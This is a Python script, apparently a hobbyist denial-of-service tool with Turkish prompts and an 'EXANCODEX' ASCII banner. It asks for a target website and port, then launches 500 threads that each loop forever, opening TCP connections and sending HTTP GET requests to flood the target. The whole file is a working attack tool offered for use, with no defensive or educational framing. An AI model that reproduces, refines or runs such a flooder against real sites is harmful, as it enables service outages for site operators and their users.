import socket
import threading 
from pip._vendor.colorama import Fore
import subprocess
import datetime

subprocess.call("clear", shell=True)


x = datetime.datetime.now()

aS = x.day
bS = x.month
cS = x.year
eS = x.hour
fS = x.month
gS = x.second

timedown = str(eS)+':'+str(fS)+':'+str(gS)+' - '+str(aS)+'/'+str(bS)+'/'+str(cS)

tag = (Fore.YELLOW+'exancodex&wulfrick')





baner31 = f"""
     . -  -" - - . 
     /            \ 
    /    o  o     \   
   (       ^       , ) 
    \     __,     /- . _ 
     `. _____   .'      `- - .__ 
            \   /                   `/ ` ` "    " ' - . 
             Y    7               /                 : 
             |   /                 |            . - - .            EXANCODEX
             /  /        __       \ /    `. __. :. ____. - . 
            /  / / `  "    "  "  ` /         .-"..____    . - .\ 
        _.-'  /_/               (                          \ - . \ 
       `=----'                     `- - - - - - - - - -  ' " "  `-. \ DDOS
    discord-> serkanth
    Tarih-Saat = {Fore.YELLOW+timedown}   """

print(Fore.RED+baner31)

print(Fore.BLUE+"DDos Website")
print(Fore.BLUE+"website url")
target = input(Fore.RED+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Website"+Fore.RED+"""/
 └──╼ """+Fore.LIGHTRED_EX+"=> ")

print("Port Tarama uzerinden baktığınzı açık portu girin")
port = input(Fore.RED+" ┌─/"+Fore.LIGHTRED_EX+"Write Port"+Fore.RED+"""/
 └──╼ """+Fore.LIGHTRED_EX+"=> ")

port = int(port)

attack_num = 0

print("Sending Packets...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print(Fore.CYAN+'[!]'+"Paketler Gönderiliyor------> "+Fore.YELLOW+packesnum)
        
        
print("Paketler Basari ile gonderildi!")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()